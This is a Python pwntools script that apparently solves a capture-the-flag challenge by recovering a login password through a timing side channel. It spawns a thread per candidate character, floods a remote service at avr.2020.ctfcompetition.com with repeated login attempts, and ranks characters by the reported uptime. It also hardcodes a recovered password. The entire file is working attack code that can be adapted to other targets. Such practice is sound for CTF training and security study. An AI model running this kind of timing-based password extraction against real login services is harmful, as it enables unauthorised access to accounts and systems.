from pwn import *
import string
import time
import tqdm
import Queue 
import threading

charset = string.letters + string.digits + '!_?#@'
real_pw = "doNOTl4unch_missi1es!"

# you'll need to play with this untill it works... I don't know the exact recipe...
PRE = ''
TIMES = 560

def get_uptime(s):
    value = -1
    for line in s.split('\n'):
        try:
            if "Uptime" in line:
                value = int(line.split(' ')[1].replace('us', ''))
        except:
            print line
            raise Exception("timed out")
    return value

def get_letter_time(let, times, prefix = ''):
    context.log_level = 30
    conn = remote("avr.2020.ctfcompetition.com", 1337)
    creds = "agent\n" + prefix + let + "\n"
    # the most important thing is to send the most amount of times that the program will run
    # before giving us timeout
    conn.send('\n' + creds * times)
    arr = []
    out = conn.recvall()
    if "granted" in out:
        print "password is: " + prefix + let

    elif out.count("Login") < times+1:
        print "Timed out for " + prefix + let

    conn.close()
    return get_uptime(out)

def get_letter_avg(let, times, avg_size = 1, prefix = ''):
    avg_arr = []
    for i in range(avg_size):
        avg_arr.append(get_letter_time(let, times, prefix))

    return sum(avg_arr)/len(avg_arr)

def get_letter_avg_threading(let, times, q, avg_size = 1, prefix = ''):
    q.put((let, get_letter_avg(let, times, avg_size, prefix)))

def time_thread(seconds):
    print "time: " + str(seconds) + " seconds"
    for i in tqdm.tqdm(range(seconds)):
        time.sleep(1)

def get_next_letter(prefix, times):
    q = Queue.Queue()
    threads = []
    for c in charset:
        t = threading.Thread(target = get_letter_avg_threading, args = (c, times, q, 1, prefix))
        t.start()
        threads.append(t)

    t = threading.Thread(target = time_thread, args=(11,))
    t.start()
    threads.append(t)

    for t in threads:
        t.join()

    tbl = {}
    while not q.empty():
        c, time = q.get()
        tbl[c] = time

    sorted_tbl = sorted(tbl.items(), key = lambda x: x[1])
    print sorted_tbl
    return sorted_tbl[-1][0]

def timing_attack(pre = ''):
    cur = pre
    for i in range(5):
        times = TIMES - (10 * len(cur))
        print "current password: " + cur + " times = " + str(times)
        res = get_next_letter(cur, times)
        print "next char is: " + res
        cur += res

timing_attack(PRE)
